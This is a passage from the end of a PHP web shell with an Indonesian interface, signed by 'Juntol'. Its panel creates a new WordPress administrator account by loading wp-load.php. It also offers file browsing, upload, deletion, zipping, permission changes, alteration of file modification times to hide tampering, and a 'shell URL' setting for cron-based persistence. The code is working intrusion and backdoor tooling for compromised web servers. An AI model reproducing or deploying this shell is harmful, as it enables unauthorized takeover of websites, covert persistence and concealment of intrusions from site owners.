                         if (!$wp_loaded_check_html_page_creator_final_full_html) { $wp_admin_feedback_text = 'ERROR: Gagal memuat WP dari: code>' . call_user_func($htmlspecialchars_fn, $wp_load_path_display_html_page_creator_final_full_html) . '</code>.'; $wp_admin_feedback_class = 'error'; }
                         elseif(!function_exists('wp_nonce_field')){ $wp_admin_feedback_text = 'ERROR: Fungsi WordPress tidak ditemukan setelah memuat wp-load.php.'; $wp_admin_feedback_class = 'error'; }
                    }
                } elseif (empty($wp_admin_feedback_text)) { $wp_admin_feedback_text = 'KRITIS: File <code>wp-load.php</code> tidak dapat ditemukan otomatis.'; $wp_admin_feedback_class = 'error'; }
                if (!empty($wp_admin_feedback_text)): ?>
                    <div class="message <?php echo call_user_func($htmlspecialchars_fn, $wp_admin_feedback_class); ?> wp-admin-creator-form"> <p><?php echo $wp_admin_feedback_text; ?></p> </div> <?php endif; ?>
                <?php if ($can_show_wp_form_html_page_creator_final_full_html): ?>
                <form method="POST" action="?menu=wp_admin_creator&path=<?php echo urlencode($current_path); ?>" class="wp-admin-creator-form">
                    <input type="hidden" name="action" value="create_wp_admin">
                    <?php if(function_exists('wp_nonce_field')) wp_nonce_field('create_admin_action', 'create_admin_nonce'); ?>
                    <label for="username_input_wp">Username:</label>
                    <input type="text" id="username_input_wp" name="username" required value="<?php echo isset($_POST['username']) ? call_user_func($htmlspecialchars_fn, $_POST['username']) : ''; ?>">
                    <label for="password_input_wp">Password (min. 8 karakter):</label>
                    <input type="password" id="password_input_wp" name="password" required>
                    <label for="email_input_wp">Email (opsional):</label>
                    <input type="email" id="email_input_wp" name="email" placeholder="admin@example.com" value="<?php echo isset($_POST['email']) ? call_user_func($htmlspecialchars_fn, $_POST['email']) : ''; ?>">
                    <button type="submit" class="full-width">Buat Admin WordPress</button>
                </form>
                <?php elseif(empty($wp_admin_feedback_text)): ?> <p style="color:#ff4444;">Form WP Admin tidak bisa ditampilkan.</p> <?php endif; ?>
            </section>
            <?php endif; ?>

        </main>
    </div>
    <footer class="footer">
        :: SESSION ESTABLISHED :: SCRIPT BY Juntol :: EXTENDED FUNCTIONALITY V5.4 ::
    </footer>

    <div id="create-modal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h2 id="modal-title"></h2>
            <form method="POST" action="<?php echo call_user_func($htmlspecialchars_fn, $_SERVER['REQUEST_URI']); ?>">
                <input type="hidden" name="action" value="create_new_item">
                <div id="modal-input-container"></div>
                <button type="submit" class="full-width" style="margin-top: 15px;">Submit</button>
            </form>
        </div>
    </div>
    
    <form method="post" id="chmod-form" style="display:none;">
        <input type="hidden" name="action" value="change_chmod">
        <input type="hidden" name="target" id="chmod-target">
        <input type="hidden" name="new_perms" id="chmod-new-perms">
    </form>
    
    <form method="post" id="mtime-form" style="display:none;">
        <input type="hidden" name="action" value="change_mtime">
        <input type="hidden" name="target" id="mtime-target">
        <input type="hidden" name="new_mtime" id="mtime-new-val">
    </form>

    <script>
        function setShellUrlForCron(selectedUrl) { document.getElementById('url_cron_input').value = selectedUrl; }
        function confirmDelete(itemName) { return confirm("Are you sure you want to delete '" + itemName + "'? This action CANNOT be undone."); }
        function renameItem(currentPath, currentNameEncoded, currentNameDisplay) {
            var newName = prompt("Enter new name for '" + currentNameDisplay + "':", currentNameDisplay);
            if (newName !== null && newName !== "" && newName.trim() !== "" && newName !== currentNameDisplay) {
                if (newName.indexOf('/') !== -1 || newName.indexOf('\\') !== -1 || newName === "." || newName === "..") { alert("Invalid characters in new name."); return false; }
                window.location.href = "?menu=explorer&path=" + currentPath + "&file_action=rename&target=" + currentNameEncoded + "&new_name=" + encodeURIComponent(newName.trim());
            }
        }
        
        function changePerms(targetName, currentPerms) {
            var newPerms = prompt("Enter new permissions for '" + targetName + "' (e.g., 0755):", currentPerms);
            if (newPerms !== null && newPerms.trim() !== "" && newPerms !== currentPerms) {
                if (!/^[0-7]{3,4}$/.test(newPerms.trim())) {
                    alert("Invalid permission format. Please use 3 or 4 octal digits (e.g., 755 or 0755).");
                    return;
                }
                document.getElementById('chmod-target').value = targetName;
                document.getElementById('chmod-new-perms').value = newPerms.trim();
                document.getElementById('chmod-form').action = '?menu=explorer&path=<?php echo urlencode($current_path); ?>';
                document.getElementById('chmod-form').submit();
            }
        }
        
        function changeMtime(targetName, currentMtime) {
            var newMtime = prompt("Enter new last modify time for '" + targetName + "' (YYYY-MM-DD HH:MM:SS):", currentMtime);
            if (newMtime !== null && newMtime.trim() !== "" && newMtime !== currentMtime) {
                document.getElementById('mtime-target').value = targetName;
                document.getElementById('mtime-new-val').value = newMtime.trim();
                document.getElementById('mtime-form').action = '?menu=explorer&path=<?php echo urlencode($current_path); ?>';
                document.getElementById('mtime-form').submit();
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const selectAllCheckbox = document.getElementById('select-all-checkbox');
            const itemCheckboxes = document.querySelectorAll('.item-checkbox');
            const bulkActionForm = document.getElementById('bulk-action-form');

            if (selectAllCheckbox) {
                selectAllCheckbox.addEventListener('change', function() {
                    itemCheckboxes.forEach(function(checkbox) {
                        checkbox.checked = selectAllCheckbox.checked;
                    });
                });
            }

            if (bulkActionForm) {
                bulkActionForm.addEventListener('submit', function(e) {
                    const operation = this.elements.bulk_operation.value;
                    const selectedItems = document.querySelectorAll('.item-checkbox:checked').length;
                    
                    if (operation === "") {
                        alert("Pilih aksi massal terlebih dahulu.");
                        e.preventDefault();
                        return;
                    }

                    if (selectedItems === 0) {
                        alert("Tidak ada item yang dipilih.");
                        e.preventDefault();
                        return;
                    }

                    if (operation === 'delete') {
                        if (!confirm("Anda yakin ingin menghapus " + selectedItems + " item yang dipilih? Aksi ini tidak dapat dibatalkan.")) {
                            e.preventDefault();
                        }
                    }
                    if (operation === 'zip') {
                        let zipFilename = this.elements.zip_filename.value.trim();
                        if (zipFilename === "") {
                            zipFilename = "archive.zip";
                            this.elements.zip_filename.value = zipFilename;
                        }
                        if (!confirm("Buat arsip '" + zipFilename + "' dari " + selectedItems + " item yang dipilih?")) {
                             e.preventDefault();
                        }
                    }
                });
            }
        });

        // Modal script
        var modal = document.getElementById("create-modal");
        var btnFile = document.getElementById("create-file-btn");
        var btnFolder = document.getElementById("create-folder-btn");
        var spanClose = document.getElementsByClassName("close-btn")[0];
        var modalTitle = document.getElementById("modal-title");
        var modalInputContainer = document.getElementById("modal-input-container");

        if (btnFile) {
            btnFile.onclick = function() {
                modalTitle.innerHTML = "Buat File Baru";
                modalInputContainer.innerHTML = '<label for="new_file_name">Nama File:</label><input type="text" name="new_file_name" required autofocus>';
                modal.style.display = "block";
            }
        }
        if (btnFolder) {
            btnFolder.onclick = function() {
                modalTitle.innerHTML = "Buat Folder Baru";
                modalInputContainer.innerHTML = '<label for="new_folder_name">Nama Folder:</label><input type="text" name="new_folder_name" required autofocus>';
                modal.style.display = "block";
            }
        }
        if(spanClose) {
            spanClose.onclick = function() {
                modal.style.display = "none";
            }
        }
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
        
        // Script for custom file upload button
        const fileInput = document.getElementById('file-upload-input');
        const fileInfo = document.getElementById('file-upload-filename');

        if (fileInput) {
            fileInput.addEventListener('change', function() {
                if (fileInput.files.length > 0) {
                    const fileName = fileInput.files[0].name;
                    fileInfo.textContent = fileName;
                } else {
                    fileInfo.textContent = 'No file selected.';
                }
            });
        }
    </script>
</body>
</html>